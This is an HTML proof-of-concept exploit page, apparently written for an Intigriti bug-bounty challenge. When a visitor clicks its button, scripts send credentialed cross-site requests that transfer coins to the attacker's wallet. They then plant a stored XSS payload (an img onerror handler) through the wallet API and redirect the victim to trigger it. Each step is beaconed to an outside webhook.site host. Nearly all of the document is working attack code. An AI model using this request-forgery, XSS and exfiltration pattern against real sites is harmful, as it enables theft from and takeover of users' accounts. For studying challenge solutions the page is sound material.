<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC</title>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    <button id="exploitBtn">Click to Run Exploit</button>
    <div id="status">Waiting...</div>

    <script>
        const BASE = 'https://challenge-0126.intigriti.io';
        const WEBHOOK = 'https://webhook.site/9bcbf2c0-2010-4890-ba51-ce334ba4b12b';
        const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';
        const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';

        // Webhook tracking function
        function track(step, status, data = {}) {
            const url = `${WEBHOOK}/${step}-${status}`;
            const payload = {
                step: step,
                status: status,
                data: data,
                timestamp: new Date().toISOString()
            };

            // Send via Image (fire and forget)
            new Image().src = `${WEBHOOK}?step=${step}&status=${status}&timestamp=${Date.now()}&data=${encodeURIComponent(JSON.stringify(data))}`;

            console.log(`[Webhook] ${step}: ${status}`, data);
        }

        async function runExploit() {
            const btn = document.getElementById('exploitBtn');
            const statusDiv = document.getElementById('status');

            btn.disabled = true;
            btn.style.opacity = '0.5';

            track('start', 'exploit_triggered', { wallet: YOUR_WALLET });

            try {
                // Step 1: Send 1337COIN to your wallet (required for flag)
                statusDiv.textContent = 'Step 1: Sending 1337COIN to your wallet...';
                track('step1', 'sending_coins', { toAddress: YOUR_WALLET, currency: '1337COIN', amount: 1337 });

                const txResponse = await fetch(`${BASE}/api/transaction`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    credentials: 'include',
                    body: JSON.stringify({
                        toAddress: YOUR_WALLET,
                        currency: '1337COIN',
                        amount: 1
                    })
                });

                if (txResponse.ok) {
                    const txResult = await txResponse.json();
                    statusDiv.textContent = '✓ Coins sent! TX: ' + (txResult.txHash || 'success');
                    track('step1', 'coins_sent_success', { txHash: txResult.txHash, result: txResult });
                } else {
                    const errorText = await txResponse.text();
                    statusDiv.textContent = '⚠ Transaction failed: ' + txResponse.status;
                    track('step1', 'coins_failed', { status: txResponse.status, error: errorText });
                }

                // Step 2: Inject XSS via wallet creation
                statusDiv.textContent = 'Step 2: Injecting XSS payload via wallet API...';
                track('step2', 'injecting_xss', { payload: XSS_PAYLOAD });

                const walletResponse = await fetch(`${BASE}/api/wallets`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    credentials: 'include',
                    body: JSON.stringify({
                        currency: '1337COIN',
                        address: XSS_PAYLOAD,
                        balance: 1337
                    })
                });

                if (walletResponse.ok) {
                    statusDiv.textContent = '✓ XSS injected! Redirecting to dashboard...';
                    track('step2', 'xss_injected_success', { message: 'XSS payload injected via wallet API' });
                } else {
                    const errorText = await walletResponse.text();
                    statusDiv.textContent = '⚠ Wallet API returned ' + walletResponse.status + ' - Redirecting anyway...';
                    track('step2', 'xss_injected_partial', { status: walletResponse.status, error: errorText });
                }

                // Step 3: Redirect to dashboard to trigger XSS
                statusDiv.textContent = 'Step 3: Triggering XSS...';
                track('step3', 'redirecting_to_dashboard', { target: `${BASE}/dashboard.html` });

                setTimeout(() => {
                    track('final', 'redirected', { message: 'Should trigger alert("gigawatz")' });
                    window.location.href = `${BASE}/dashboard.html`;
                }, 500);

            } catch (error) {
                statusDiv.textContent = `Error: ${error.message}`;
                track('error', 'exception', { error: error.message, stack: error.stack });

                // Fallback: Try redirecting anyway
                setTimeout(() => {
                    track('fallback', 'redirecting_anyway', { message: 'Attempting redirect after error' });
                    window.location.href = `${BASE}/dashboard.html`;
                }, 1500);
            }
        }

        document.getElementById('exploitBtn').addEventListener('click', runExploit);
    </script>
</body>
</html>
